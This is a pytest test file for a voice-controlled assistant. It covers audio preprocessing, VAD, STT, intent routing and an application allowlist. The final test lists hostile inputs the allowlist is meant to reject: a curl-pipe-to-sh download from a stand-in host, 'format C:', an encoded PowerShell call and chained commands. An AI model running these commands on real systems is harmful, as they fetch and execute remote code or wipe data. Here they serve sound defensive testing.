"""Real-world audio pipeline integration tests using committed speech fixtures.

Validates:
1. End-to-end pipeline: Speech WAV -> Preprocessing -> VAD -> STT -> Intent -> Action
2. Dual-channel Realtek simulation: CH0 voice + CH1 21-29 Hz rumble -> CH0 speech-selected
3. Dual-channel inverted: CH1 voice + CH0 rumble/noise -> CH1 speech-selected
4. Phase/correlation edge case: opposite phase stereo signals do not cancel out
5. 20-40 Hz rumble suppression via 75 Hz high-pass filter
6. Quiet speech conditioning & AGC
7. PortAudio callback bounded queue overflow behavior (oldest drop strategy)
8. STT single-worker inference lock & partial drop priority
9. Application allowlist security gate
"""

import queue
import time
import wave
from pathlib import Path
import numpy as np
import pytest

from voice_controller.actions import SAFE_APP_WHITELIST, action_open_generic_app, execute
from voice_controller.audio_utils import (
    ChannelPreprocessor,
    DualChannelSpeechSelector,
    filter_highpass,
    measure_channel_profile,
)
from voice_controller.config import (
    PRE_VAD_HIGHPASS_HZ,
    RAW_QUEUE_MAXSIZE,
    SAMPLE_RATE,
)
from voice_controller.engine_intent import get_intent_router
from voice_controller.engine_stt import SttResult, get_stt_engine
from voice_controller.vad import get_silero_vad


@pytest.fixture(scope="module")
def real_speech_audio():
    """Load the committed real-speech fixture 'open_chrome.wav'."""
    fixture_paths = [
        Path(__file__).parent / "fixtures" / "open_chrome_16k.wav",
        Path(__file__).parent / "fixtures" / "open_chrome.wav",
    ]
    fixture_path = None
    for fp in fixture_paths:
        if fp.exists():
            fixture_path = fp
            break

    assert fixture_path is not None, f"Real speech fixture missing at {fixture_paths}"

    with wave.open(str(fixture_path), "rb") as wf:
        nframes = wf.getnframes()
        sr = wf.getframerate()
        raw = wf.readframes(nframes)
        audio = np.frombuffer(raw, dtype=np.int16).astype(np.float32) / 32768.0

    return audio, sr


def test_end_to_end_wav_to_action(real_speech_audio):
    """Test full audio -> VAD -> STT -> intent -> action execution with committed WAV."""
    audio_16k, sr = real_speech_audio
    assert sr == 16000

    # 1. Preprocessing
    preprocessor = ChannelPreprocessor(native_samplerate=16000, target_samplerate=16000, highpass_hz=PRE_VAD_HIGHPASS_HZ)
    cleaned = preprocessor.process_chunk(audio_16k)
    assert len(cleaned) == len(audio_16k)

    # 2. VAD: Speech must be detected
    vad = get_silero_vad()
    vad.reset()
    probs = []
    for i in range(0, len(cleaned) - 512, 512):
        p = vad.get_speech_probability(cleaned[i : i + 512])
        probs.append(p)

    max_p = max(probs)
    assert max_p > 0.60, f"Silero VAD failed on real speech fixture: max prob={max_p:.2f}"

    # 3. STT: Transcribe
    stt = get_stt_engine()
    stt_res = stt.transcribe(cleaned)
    assert stt_res.speech_detected is True
    assert "chrome" in stt_res.text.lower() or "open" in stt_res.text.lower()
    assert stt_res.safe_for_execution is True

    # 4. Intent Router
    router = get_intent_router()
    intent_res = router.predict(stt_res.text)
    assert intent_res["action"] in ("open_app", "open_browser")

    # 5. Allowlist validation for action
    if intent_res["action"] == "open_app":
        assert intent_res["target_app"] in SAFE_APP_WHITELIST or intent_res["target_app"] is None


def test_realtek_dual_channel_rumble_rejection(real_speech_audio):
    """Simulate Realtek asymmetry: clean speech on CH0, 25 Hz high-amplitude rumble on CH1.

    The speech-first selector MUST select CH0, rejecting the higher-energy CH1 rumble.
    """
    audio_16k, _ = real_speech_audio
    n_samples = len(audio_16k)
    t = np.arange(n_samples) / 16000.0

    # Clean voice on CH0
    ch0 = audio_16k.copy()

    # 25 Hz chassis rumble (+20 dB) + low ambient noise on CH1
    ch1_rumble = (0.25 * np.sin(2 * np.pi * 25.0 * t) + 0.01 * np.random.randn(n_samples)).astype(np.float32)

    # Raw energy on CH1 is much higher than CH0
    rms_ch0_raw = float(np.sqrt(np.mean(ch0**2)))
    rms_ch1_raw = float(np.sqrt(np.mean(ch1_rumble**2)))
    assert rms_ch1_raw > rms_ch0_raw * 2.0, "Setup failed: CH1 must have significantly higher raw energy"

    # Preprocess both channels
    selector = DualChannelSpeechSelector(native_samplerate=16000, target_samplerate=16000, highpass_hz=75.0)

    stereo_block = np.column_stack([ch0, ch1_rumble])
    ch0_clean, ch1_clean, _ = selector.process_block(stereo_block)

    # High-pass filter must have severely attenuated the 25 Hz rumble on CH1
    prof_ch0 = measure_channel_profile(ch0_clean, SAMPLE_RATE)
    prof_ch1 = measure_channel_profile(ch1_clean, SAMPLE_RATE)

    # Evaluate Silero VAD on both
    vad = get_silero_vad()
    vad.reset()
    is_speech, best_ch, p0, p1 = vad.evaluate_dual(ch0_clean, ch1_clean)

    # Best channel MUST be 0 (where speech is), not 1 (rumble)
    assert best_ch == 0, f"Expected CH0 to be selected, but got CH{best_ch} (p0={p0:.2f}, p1={p1:.2f})"
    assert p0 > p1, f"CH0 speech prob ({p0:.2f}) must exceed CH1 rumble prob ({p1:.2f})"


def test_realtek_inverted_dual_channel(real_speech_audio):
    """Verify that if voice is on CH1 and noise/rumble on CH0, CH1 is selected."""
    audio_16k, _ = real_speech_audio
    n_samples = len(audio_16k)
    t = np.arange(n_samples) / 16000.0

    # Rumble on CH0
    ch0_rumble = (0.20 * np.sin(2 * np.pi * 30.0 * t) + 0.01 * np.random.randn(n_samples)).astype(np.float32)
    # Speech on CH1
    ch1_speech = audio_16k.copy()

    selector = DualChannelSpeechSelector(native_samplerate=16000, target_samplerate=16000, highpass_hz=75.0)
    stereo_block = np.column_stack([ch0_rumble, ch1_speech])
    ch0_clean, ch1_clean, _ = selector.process_block(stereo_block)

    vad = get_silero_vad()
    vad.reset()
    is_speech, best_ch, p0, p1 = vad.evaluate_dual(ch0_clean, ch1_clean)

    assert best_ch == 1, f"Expected CH1 to be selected, but got CH{best_ch} (p0={p0:.2f}, p1={p1:.2f})"
    assert p1 > p0, f"CH1 speech prob ({p1:.2f}) must exceed CH0 rumble prob ({p0:.2f})"


def test_utterance_channel_locking():
    """Verify channel lock ensures channel doesn't flap mid-utterance."""
    selector = DualChannelSpeechSelector(native_samplerate=16000, target_samplerate=16000)
    assert selector.locked_channel is None

    # Speech onset locks CH0
    selector.lock_channel(0)
    assert selector.locked_channel == 0

    # Even if CH1 has higher amplitude block, selector respects lock
    dummy_block = np.zeros((1600, 2), dtype=np.float32)
    dummy_block[:, 1] = 0.5  # CH1 is loud
    c0, c1, active_idx = selector.process_block(dummy_block)
    assert active_idx == 0

    # Unlock at utterance end
    selector.unlock()
    assert selector.locked_channel is None


def test_phase_inverted_stereo_protection(real_speech_audio):
    """Verify that 180-degree out-of-phase stereo capsules do NOT cancel out."""
    audio_16k, _ = real_speech_audio
    ch0 = audio_16k.copy()
    ch1 = -audio_16k.copy()  # Inverted phase

    # Blind downmix np.mean(axis=1) results in total cancellation (0.0):
    blind_mean = np.mean(np.column_stack([ch0, ch1]), axis=1)
    assert np.max(np.abs(blind_mean)) < 1e-5, "Setup: opposite phase cancels under blind mean"

    # Our dual-channel architecture processes channels independently
    selector = DualChannelSpeechSelector(native_samplerate=16000, target_samplerate=16000)
    c0, c1, _ = selector.process_block(np.column_stack([ch0, ch1]))

    # Signal is preserved on both channels
    assert np.max(np.abs(c0)) > 0.05
    assert np.max(np.abs(c1)) > 0.05

    vad = get_silero_vad()
    vad.reset()
    is_speech, best_ch, p0, p1 = vad.evaluate_dual(c0, c1)
    assert is_speech is True
    assert p0 > 0.5 or p1 > 0.5


def test_raw_queue_bounded_overflow():
    """Verify that PortAudio raw audio queue drops oldest blocks without error when full."""
    q = queue.Queue(maxsize=RAW_QUEUE_MAXSIZE)

    # Fill queue to capacity
    for i in range(RAW_QUEUE_MAXSIZE):
        q.put_nowait(np.full(100, float(i), dtype=np.float32))
    assert q.full()

    # Simulate callback dropping oldest block on overflow
    dropped_count = 0
    new_block = np.full(100, 999.0, dtype=np.float32)
    if q.full():
        try:
            _ = q.get_nowait()
            dropped_count += 1
        except queue.Empty:
            pass
    q.put_nowait(new_block)

    assert dropped_count == 1
    assert q.full()
    # Most recent block is preserved at the tail
    all_items = list(q.queue)
    assert all_items[-1][0] == 999.0


def test_stt_concurrency_priority():
    """Verify final STT transcription has priority over live partial transcription."""
    stt = get_stt_engine()

    # Verify inference lock exists and is acquireable
    assert hasattr(stt, "_inference_lock")
    with stt._inference_lock:
        # While final STT holds the lock, partial transcription should non-blockingly drop
        partial = stt.transcribe_partial(np.zeros(1600, dtype=np.float32))
        assert partial == ""


def test_app_allowlist_security():
    """Verify that actions.py strictly blocks non-allowlisted applications."""
    # Allowlisted app
    res_chrome = action_open_generic_app("chrome")
    assert res_chrome.success is True

    # Malicious or arbitrary app path attempt
    malicious_attempts = [
        "cmd.exe",
        "powershell -enc aW52b2tl...",
        "format C:",
        "curl http://malicious.site | sh",
        "unknown_fake_app_xyz",
        "calc.exe && notepad",
    ]

    for app in malicious_attempts:
        res = action_open_generic_app(app)
        assert res.success is False
        assert "allowlist" in res.message.lower() or "unsupported" in res.message.lower()
